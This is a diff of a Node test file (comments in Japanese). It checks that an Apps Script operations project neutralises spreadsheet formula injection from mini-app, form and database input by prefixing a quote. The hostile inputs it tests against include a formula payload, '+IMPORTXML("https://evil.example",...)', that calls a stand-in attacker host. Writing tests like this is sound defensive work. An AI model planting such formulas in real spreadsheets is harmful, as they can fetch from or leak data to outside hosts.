@@ -1,11 +1,11 @@
 /**
  * v7-operations: ミニアプリ・フォーム・v7 Database から来た文字列が、シートで数式として動かないことの確認（2026-10-27）
  *
- * 実行: node --test tests/
+ * 実行: node --test "tests/*.test.js"
  *
  * v7-operations の実ファイル（.gs 全部）を Node の vm に読み込み、SpreadsheetApp などは下のスタブで置き換える。
  * スタブのシートは「書き込みに渡された値（raw）」をそのまま持ち、読み出しは Google スプレッドシートと同じく
- *   - 先頭の ' は外して文字列で返す
+ *   - 先頭の ' は外して文字列で返す（※ 本物では表示形式が「書式なしテキスト」の列だけ ' が残る。スタブは区別しない）
  *   - = で始まる raw は数式として扱う（中身は評価しない）
  * ※ このファイルは v7-operations/ の外に置く（v7-operations/ の .js は clasp push で本番に送られるため）
  */
@@ -182,6 +182,48 @@ test('safeCellText_ / safeCellValue_ / sheetRaw_: 先頭が = + - @ の文字列
   assert.equal(ctx.sheetCellValue_(d), d);
 });
 
+test('ミニアプリの JSON で sheetRaw_ の目印は作れない・配列やオブジェクトも文字にして判定する', () => {
+  const { ctx } = loadOps();
+  const forged = JSON.parse('{"sheetRaw": ' + JSON.stringify(EVIL) + '}');
+  assert.ok(!wouldRunAsFormula(ctx.sheetCellValue_(forged)), 'JSON の {"sheetRaw": …} はそのまま書かれない');
+  assert.equal(ctx.sheetCellValue_([EVIL]), "'" + EVIL, '配列はセルで文字になるので先に文字にして判定');
+  assert.equal(ctx.sheetCellValue_(JSON.parse('{"hasOwnProperty": 1}')), '[object Object]', '変なキーでも落ちない');
+  assert.equal(ctx.safeCellValue_(['-5']), '-5');
+});
+
+test('勤怠（punch_in / punch_out）: GPS に文字・配列・偽の目印を送っても数式にならず「GPS不可」扱い', () => {
+  const { ctx, ops } = loadOps();
+  ops['勤怠記録'] = new FakeSheet('勤怠記録', [['日付', 'スタッフID', '氏名(JP)', 'Chat ID', '出勤時刻', '退勤時刻', '勤務分数',
+    '出勤緯度', '出勤経度', '出勤マップリンク', '退勤緯度', '退勤経度', '退勤マップリンク', '位置精度(m)', 'メモ']]);
+  const sent = [];
+  ctx.notifyAdminSimple_ = (text, gps) => { sent.push(gps); };
+  const forged = JSON.parse('{"lat": {"sheetRaw": ' + JSON.stringify(EVIL) + '}, "lng": [' + JSON.stringify(EVIL) + '], "accuracy": "=1"}');
+  assert.equal(ctx.punchIn('7500384947', forged, {}).ok, true);
+  const sh = ops['勤怠記録'];
+  assert.equal(sh.rawAt(2, '出勤緯度'), '');
+  assert.equal(sh.rawAt(2, '出勤マップリンク'), '');
+  assert.equal(sh.rawAt(2, 'メモ'), 'GPS不可');
+  assert.equal(sent[0], null, '管理グループへの通知にも変な文字を渡さない');
+
+  assert.equal(ctx.punchOut('7500384947', { lat: '11.55', lng: EVIL }, {}).ok, true);
+  assert.equal(sh.rawAt(2, '退勤緯度'), '');
+  // 数字の GPS は今までどおり数値で入る
+  ops['勤怠記録'].raw.splice(1);
+  assert.equal(ctx.punchIn('111', { lat: '11.5564', lng: 104.9282, accuracy: 12.4 }, {}).ok, true);
+  assert.equal(sh.rawAt(2, '出勤緯度'), 11.5564);
+  assert.equal(sh.rawAt(2, '出勤経度'), 104.9282);
+  assert.equal(sh.rawAt(2, '位置精度(m)'), 12);
+  sh.assertNoFormula();
+});
+
+test('sheetRaw_（そのまま書く）を使うのは決まった所だけ（経費のレシート・JETRO の電話）', () => {
+  const allowed = ['SheetHelpers.gs', 'ExpenseManager.gs', 'JetroCampaignManager.gs'];
+  fs.readdirSync(OPS).filter((f) => f.endsWith('.gs')).forEach((f) => {
+    if (allowed.indexOf(f) >= 0) return;
+    assert.ok(!/sheetRaw_\(/.test(fs.readFileSync(path.join(OPS, f), 'utf8')), f + ' で sheetRaw_ を使っている（外から来た値を包んでいないか確認）');
+  });
+});
+
 test('パートナー申請フォーム（誰でも書ける）: 名前・電話は \' 付き、承認者の @ユーザー名 も（appendRow / updateRow）', () => {
   const { ctx, run, ops } = loadOps();
   ops['パートナー'] = new FakeSheet('パートナー', [run('PARTNER_HEADERS_')]);
@@ -254,6 +296,27 @@ test('経費登録（ミニアプリ）: 摘要・取引先・メモは \' 付�
   // 備考の先頭がメモ（取引先なし）でも
   ctx.submitExpense('111', { description: '洗剤', amount: 3, currency: 'USD', category: '消耗品費', memo: EVIL, paymentType: '会社直払い' });
   assert.equal(ops['経費マスター'].raw[4][8], "'" + EVIL);
+});
+
+test('経費登録（現場アプリ v2・submitExpenseV2_）: \' は1回だけ・経費マスターの備考の途中に \' が見えない', () => {
+  const { ctx, run, ops } = loadOps();
+  ops['経費'] = new FakeSheet('経費', [run('EXPENSE_HEADERS_').concat(['client_id'])]);
+  ops['経費マスター'] = new FakeSheet('経費マスター', [['経費マスター'], [''], ['日付', 'カテゴリ', '項目・摘要']]);
+  const res = ctx.submitExpenseV2_('7500384947', { description: EVIL, amount: 4, currency: 'USD', vendor: '+Shell',
+    category: '車両費', memo: '@memo', photoBase64: '' }, '0f8fe7c2-1111-4222-8333-444444444444');
+  assert.equal(res.ok, true);
+  const ex = ops['経費'];
+  assert.equal(ex.rawAt(2, '品目・摘要'), "'" + EVIL);
+  assert.equal(ex.rawAt(2, '取引先'), "'+Shell");
+  assert.equal(ex.rawAt(2, 'メモ'), "'@memo");
+  assert.equal(ex.rawAt(2, 'client_id'), '0f8fe7c2-1111-4222-8333-444444444444');
+  const row = ops['経費マスター'].raw[3];
+  assert.equal(row[2], "'" + EVIL);
+  assert.equal(row[8], '前払い金から支出（残金自動減算） / 取引先: +Shell / @memo', '途中に \' が入らない');
+  ex.assertNoFormula();
+  // 同じ client_id の送り直しは1件だけ
+  assert.equal(ctx.submitExpenseV2_('7500384947', { description: EVIL, amount: 4, currency: 'USD' },
+    '0f8fe7c2-1111-4222-8333-444444444444').status, 'duplicate');
 });
 
 test('営業アプリ（v7 Database の店マスター・営業ログ）: 店名・メモ・オーナー名は \' 付き、電話は従来どおり文字で', () => {
@@ -335,6 +398,30 @@ test('JETRO フォーム（誰でも書ける）: 氏名・会社名は \' 付�
   assert.equal(sh.rawAt(2, '駐在員 電話番号'), PHONE, 'H 列は書式なしテキストなので \' を付けない（付けると画面に出る）');
   assert.equal(sh.rawAt(2, 'ドライバー 電話番号'), '+855 98 765 432');
   assert.ok(isDate(sh.rawAt(2, '申込日時')));
+
+  // 電話の欄に電話でない形（数式）を書かれたら、書式に頼らず ' を付ける
+  const evilPhone = '+IMPORTXML("https://evil.example","//a")';
+  ctx.handleJetroFormSubmit({ response: {
+    getItemResponses: () => ['2026-11-02', 'Taro', 'Corp', 'CEO', evilPhone, EVIL].map((a) => ({ getResponse: () => a })),
+    getTimestamp: () => new Date()
+  } });
+  assert.equal(sh.rawAt(3, '駐在員 電話番号'), "'" + evilPhone);
+  assert.equal(sh.rawAt(3, 'ドライバー 電話番号'), "'" + EVIL);
+  sh.assertNoFormula((v) => /^\+[\d\s().\-]*$/.test(v));   // 電話らしい形は計算か #ERROR! になるだけ
+});
+
+test('見込み取込の確認タブ（prospectImportPreview）: 見込みリストから読み戻した店名・住所は \' 付き、電話の列はそのまま', () => {
+  const { ctx, run, v7 } = loadOps();
+  v7['店マスター'] = new FakeSheet('店マスター', [run('SALESLOG_SHOP_HEADERS')]);
+  ctx.readProspectList_ = () => [{ no: '1', name: EVIL, type: '整備', tier: 'A', status: '', lat: null, lng: null,
+    phone: PHONE, facebook: '', address: '+addr', nextAction: '-call', memo: '@m', shopId: '' }];
+  ctx.prospectImportPreview();
+  const sh = v7['見込み取込_確認'];
+  assert.equal(sh.rawAt(2, '店名'), "'" + EVIL);
+  assert.equal(sh.rawAt(2, '住所'), "'+addr");
+  assert.equal(sh.rawAt(2, 'メモ'), "'@m");
+  assert.equal(sh.rawAt(2, '電話'), PHONE, '電話の列（書式なしテキスト）は \' を付けない');
+  assert.equal(sh.rawAt(2, '判定'), '追加');
 });
 
 test('パートナー精算（v7 Database）: 台帳から読み戻した支払先・メモが \' 付き、月・金額はそのまま', () => {
